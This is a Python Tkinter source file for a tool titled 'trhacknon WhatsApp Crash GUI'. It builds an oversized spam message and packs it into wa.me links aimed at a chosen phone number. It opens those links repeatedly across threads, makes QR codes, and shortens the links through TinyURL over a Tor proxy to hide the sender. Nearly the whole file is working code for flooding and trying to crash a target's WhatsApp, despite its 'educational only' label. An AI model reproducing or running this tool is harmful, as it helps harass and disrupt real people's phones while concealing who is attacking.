import tkinter as tk
from tkinter import messagebox, scrolledtext
from base64 import b64encode
from io import BytesIO
from PIL import Image, ImageTk
import qrcode
import requests
import webbrowser
import threading
import time

# === Config TOR ===
USE_TOR = True
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"} if USE_TOR else {}

# === Fonctions ===

def generate_massive_message():
    base = ["*trhacknon*", "BOOM", "CRASH", "WHATSAPP", "SPAM", "██", "▒▒", "░░",
            "⚠️", "🚫", "⛔", "🚨", "🔥", "⚡", "🛑", "😈", "👾", "👽",
            "☠️", "🌀", "📛", "🧠", "🔒", "💣", "🔗"]
    repeat_block = "%0A".join([f"{word} " * 10 for word in base])
    return (repeat_block + "%0A") * 30 + "GitHub: https://github.com/trh4ckn0n"

def generate_qr_link(phone, message):
    msg_encoded = message.replace(" ", "%20").replace("\n", "%0A")
    url = f"https://wa.me/{phone}?text={msg_encoded}"
    return url

def shorten_link(link):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={link}", proxies=PROXIES, timeout=10)
        return r.text if r.status_code == 200 else link
    except Exception as e:
        return f"Erreur : {e}"

def send_crash(phone, message):
    url = f"https://wa.me/{phone}?text={message}"
    webbrowser.open(url)

def launch_attack():
    country = country_code_entry.get()
    number = number_entry.get()
    threads = int(threads_entry.get())
    target = f"{country}{number}"
    message = generate_massive_message()
    encoded = message.replace(" ", "%20").replace("\n", "%0A")

    def thread_func():
        for _ in range(threads):
            threading.Thread(target=send_crash, args=(target, encoded)).start()
            time.sleep(0.8)
        messagebox.showinfo("Succès", f"Attaque terminée sur +{target}")

    threading.Thread(target=thread_func).start()

def show_qr():
    country = country_code_entry.get()
    number = number_entry.get()
    target = f"{country}{number}"
    message = generate_massive_message()
    url = generate_qr_link(target, message)

    # Génération image QR code
    qr = qrcode.QRCode(box_size=6, border=2)
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="lime", back_color="black")

    img_tk = ImageTk.PhotoImage(img)
    qr_label.config(image=img_tk)
    qr_label.image = img_tk  # Référence persistante

    result_box.delete(1.0, tk.END)
    result_box.insert(tk.END, f"URL: {url}")
    global last_url
    last_url = url

def short_link():
    country = country_code_entry.get()
    number = number_entry.get()
    target = f"{country}{number}"
    message = generate_massive_message()
    encoded = message.replace(" ", "%20").replace("\n", "%0A")
    short = shorten_link(f"https://wa.me/{target}?text={encoded}")
    result_box.delete(1.0, tk.END)
    result_box.insert(tk.END, f"Lien raccourci: {short}")
    global last_url
    last_url = short

def open_in_browser():
    if last_url:
        webbrowser.open(last_url)

def copy_to_clipboard():
    if last_url:
        app.clipboard_clear()
        app.clipboard_append(last_url)
        app.update()
        messagebox.showinfo("Copié", "Lien copié dans le presse-papiers")

# === Interface Tkinter ===

app = tk.Tk()
app.title("trhacknon WhatsApp Crash GUI")
app.geometry("720x650")
app.configure(bg="black")

font_hacker = ("Courier New", 10, "bold")
last_url = ""

def styled_label(text, color="lime"):
    return tk.Label(app, text=text, fg=color, bg="black", font=font_hacker)

styled_label("Code Pays:").pack()
country_code_entry = tk.Entry(app, font=font_hacker, bg="black", fg="lime", insertbackground="lime")
country_code_entry.pack()

styled_label("Numéro WhatsApp:").pack()
number_entry = tk.Entry(app, font=font_hacker, bg="black", fg="lime", insertbackground="lime")
number_entry.pack()

styled_label("Nombre de threads:").pack()
threads_entry = tk.Entry(app, font=font_hacker, bg="black", fg="lime", insertbackground="lime")
threads_entry.insert(0, "10")
threads_entry.pack()

tk.Button(app, text="Lancer crash", command=launch_attack, bg="#ff0033", fg="white", font=font_hacker).pack(pady=10)
tk.Button(app, text="Générer QR", command=show_qr, bg="orange", fg="black", font=font_hacker).pack(pady=5)
tk.Button(app, text="Lien raccourci (TOR)", command=short_link, bg="green", fg="black", font=font_hacker).pack(pady=5)

tk.Button(app, text="Ouvrir dans navigateur", command=open_in_browser, bg="#4444ff", fg="white", font=font_hacker).pack(pady=5)
tk.Button(app, text="Copier lien", command=copy_to_clipboard, bg="purple", fg="white", font=font_hacker).pack(pady=5)

result_box = scrolledtext.ScrolledText(app, width=80, height=8, bg="black", fg="cyan", insertbackground="cyan", font=("Courier", 9))
result_box.pack(pady=10)

qr_label = tk.Label(app, bg="black")
qr_label.pack(pady=10)

styled_label("trhacknon - éducatif uniquement", "cyan").pack(pady=5)
if USE_TOR:
    styled_label("TOR activé - routage via 127.0.0.1:9050", "gray").pack()

app.mainloop()
